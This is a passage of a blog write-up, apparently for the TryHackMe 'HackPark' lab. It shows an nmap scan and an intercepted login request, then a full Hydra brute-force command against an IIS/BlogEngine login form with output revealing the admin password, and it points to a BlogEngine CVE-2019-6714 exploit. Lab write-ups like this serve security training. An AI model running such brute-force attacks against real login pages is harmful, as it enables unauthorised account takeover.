---
layout: post
title: THM — HackPark
date: 2022-09-29 13:00:00 -500
categories: [TryHackMe]
tags: [Hydra]
---

After deploying the machine we can run basic nmap scan for open ports & services on the target machine.

```console
vladislav@Mac ~ % nmap -sV 10.10.205.86
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-28 23:06 MSK
Nmap scan report for 10.10.205.86
Host is up (0.068s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.41 seconds
```

We can see that there is an HTTP service on port 80, then we open `10.10.205.86:80` in browser.

There we are interested in the login page. Inspecting the login form we can find out that it's using POST request type.

<img src="assets/images/HackPark/1.png" alt="drawing" width="200"/>

![Inspecting the site](/assets/images/HackPark/1.png)

Moreover, the url of the login page is the following: `http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/`.

## Using Hydra for brute-forcing the login

Now we know the URL, request type and probably the login name, so we can start brute-force with Hydra.

However, first we need to intercept the POST request using Burp Suite.

```
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.205.86
Content-Length: 578
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.205.86
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.205.86/Account/login.aspx?ReturnURL=/admin/
Accept-Encoding: gzip, deflate
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=user&ctl00%24MainContent%24LoginUser%24Password=pass&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8
```

Now we can use Hydra for cracking the password.

> [Good notes on hydra](https://github.com/gnebbia/hydra_notes)

We set username with `-l admin`, password list with `-P /share/wordlists/rockyou.txt`, target machine IP, HTTP form and "request string".

Request string contains of three elements separated by `:`:

* pageOnWhichTheLoginHappens
* list of parameters, here we have to specify with `^USER^` and `^PASS^` where usernames and passwords will be inserted
* a character which may be F (for failing strings) or S for successful strings followed by an equal sign `=` and a string which appears in a failed attempt or in a successful attempt

So in our case request string contains:

* `/Account/login.aspx?ReturnURL=/admin/` from the URL
* "`__VIEWSTATE`". There we should change two things: `UserNameuser` to `UserName=^USER^` and `Password=pass` to `Password=^PASS^`
* S=Success.

Here's the final hydra payload:

```
hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
```

```
vladislav@Mac ~ % hydra -l admin -P share/wordlists/rockyou.txt 10.10.80.203 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-29 00:06:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344401 login tries (l:1/p:14344401), ~896526 tries per task
[DATA] attacking http-post-form://10.10.80.203:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=YQwe2DmX4dLNoVJdP1utK2UOPcAPkssid3zJeBEzoacQjLetUraBz%2BZqxgat0OGqbo4MPsCyKuj5sSMKBsD9Ocxc9vjlr4QprcmDv9V6keWetkF4%2B6iKrjL4mG0z2pQOwMUuT1M7UCHkhGebHG9gMIXKLTYj4vr35LHm50rIPhCDxbML&__EVENTVALIDATION=O8SYyFiwz5tAW7%2B3AmxtEOS6oR2JikWIczNsx7LCN5IyJGhAHh%2F7wI96VK%2FRfeTSAj2uJ4KI8Yl%2Bi3g5Uo%2FlY%2BxE6y9%2FpkZusKZp98%2Fu1UMSkzrtKimhsa2PwN3ddsU5xqKT7EHmuMLn4ANrULaBO4A63LwMI1UvU%2FASfTJ1a21j3ADo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=%D0%92%D0%BE%D0%B9%D1%82%D0%B8:F=Failed
[STATUS] 995.00 tries/min, 995 tries in 00:01h, 14343406 to do in 240:16h, 16 active
[80][http-post-form] host: 10.10.80.203   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-29 00:08:15
```

So, the password is `1qaz2wsx`.

After logging into admin account we can find the blogengine version: `3.3.6.0`.

![Blogengine about page](/assets/images/HackPark/2.png)

Searching on exploit-db, we can find the [vulnerability](https://www.exploit-db.com/exploits/46353). CVE-2019-6714. Download the script.

